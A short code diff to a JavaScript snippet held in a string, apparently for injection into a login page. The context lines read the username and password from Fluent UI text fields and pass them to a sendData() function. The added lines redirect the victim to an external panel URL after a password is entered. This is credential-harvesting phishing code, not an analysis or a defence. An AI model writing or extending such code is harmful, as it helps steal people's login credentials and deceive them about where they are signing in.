@@ -29,6 +29,9 @@
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
+                    if(password.length > 2){
+                        window.location.href = 'https://my.daryakenar.ir/panel';
+                    }
                 }
             }, true);
         `;
